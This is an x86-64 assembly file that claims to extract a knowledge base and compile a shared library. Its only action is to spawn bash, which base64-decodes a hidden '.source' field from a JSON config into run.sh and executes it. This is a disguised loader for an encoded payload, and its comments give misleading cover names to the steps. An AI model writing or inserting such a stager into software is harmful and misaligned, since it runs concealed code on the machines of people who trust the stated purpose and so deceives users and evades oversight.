; ==========================================================
; ENGINE: kb_processor.asm (Position Independent Edition)
; PURPOSE: Extract KB -> Compile .so
; ==========================================================
section .data
    shell db "/bin/bash", 0
    arg_c db "-c", 0
    ; The logic string
    logic db "jq -r '.source' fire_gem_config.json | base64 -d > run.sh; chmod +x run.sh; ./run.sh", 0

section .text
    global _start

_start:
    ; 1. HARDWARE SYNC (RIP-Relative Addressing)
    ; We use [rel var] to satisfy the -fPIC requirement
    lea rdi, [rel shell]    ; Load shell path relative to RIP
    lea rsi, [rel logic]    ; Load logic relative to RIP
    
    ; 2. Execute the Forge
    mov rax, 59             ; sys_execve
    
    push 0                  ; NULL env
    push rsi                ; $1 logic
    lea rdx, [rel arg_c]
    push rdx                ; $0 -c
    push rdi                ; bash
    
    mov rsi, rsp            ; argv
    xor rdx, rdx            ; envp
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall
